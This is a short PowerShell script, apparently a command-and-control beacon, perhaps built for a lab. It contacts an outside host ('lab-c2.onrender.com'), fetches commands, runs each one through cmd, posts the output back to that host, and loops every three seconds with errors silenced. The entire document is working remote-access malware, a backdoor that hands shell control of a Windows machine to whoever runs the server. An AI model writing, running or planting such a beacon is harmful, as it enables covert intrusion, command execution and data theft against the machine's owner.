$c2 = 'https://lab-c2.onrender.com'
while($true) {
    try {
        $r = (Invoke-WebRequest -Uri "$c2/getcmd" -UseBasicParsing).Content | ConvertFrom-Json
        if ($r.cmd) {
            $o = (cmd /c $r.cmd 2>&1) | Out-String
            $body = ConvertTo-Json @{output=$o}
            Invoke-WebRequest -Uri "$c2/result" -Method POST -Body $body -ContentType 'application/json' -UseBasicParsing | Out-Null
        }
    } catch {}
    Start-Sleep -Seconds 3
}
